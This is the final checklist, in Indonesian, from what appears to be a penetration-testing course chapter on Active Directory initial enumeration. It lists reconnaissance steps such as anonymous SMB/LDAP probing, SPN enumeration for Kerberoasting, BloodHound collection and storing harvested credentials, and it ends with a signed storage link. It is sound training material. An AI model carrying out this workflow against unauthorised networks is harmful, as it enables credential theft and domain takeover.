## FINAL CHECKLIST SEBELUM PINDAH KE FILE 36

text

```
[ ] Domain name dikonfirmasi
[ ] DC IP dan hostname dicatat
[ ] Base DN diset
[ ] /etc/hosts diupdate dengan DC dan semua komputer
[ ] Anonymous SMB/LDAP/RPC sudah dicoba
[ ] SYSVOL dan NETLOGON sudah diexplore
[ ] Minimal 1 valid credentials sudah didapat
[ ] User list (valid_users.txt) sudah dibuat
[ ] Group memberships Domain Admins sudah dicek
[ ] Password policy sudah dicatat
[ ] SPN sudah dienumerate (kandidat Kerberoasting)
[ ] Trust sudah dicek
[ ] BloodHound collection (ZIP) sudah ada
[ ] Semua credentials disimpan di evidence/found_creds.txt
[ ] Semua raw output disimpan di direktori labs/ad/
```

---

> **➡️ NEXT:** Setelah data terkumpul, lanjut ke **`[🩸 36 — Active Directory BloodHound Workflow](/docs/ad-bloodhound)`** untuk analisis attack path dan temukan jalur dari current user ke Domain Admin menggunakan BloodHound CE graph analysis.

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789125263609-35_ad_initial_enumeration_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T111426Z&X-Amz-Expires=3600&X-Amz-Signature=a07417357c6a8a49600bf9e608e4cfb77abf29ce266234887a7ed190c601cf82&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)